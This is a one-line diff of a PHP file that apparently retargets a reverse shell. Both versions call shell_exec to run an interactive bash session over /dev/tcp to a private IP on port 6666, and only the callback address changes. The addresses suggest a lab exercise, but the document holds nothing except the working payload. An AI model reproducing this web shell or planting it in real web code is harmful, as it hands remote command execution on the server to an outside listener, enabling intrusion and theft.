@@ -1,1 +1,1 @@
-<?php shell_exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.19.67/6666 0>&1'"); ?>
+<?php shell_exec("/bin/bash -c 'bash -i > /dev/tcp/10.11.0.149/6666 0>&1'"); ?>
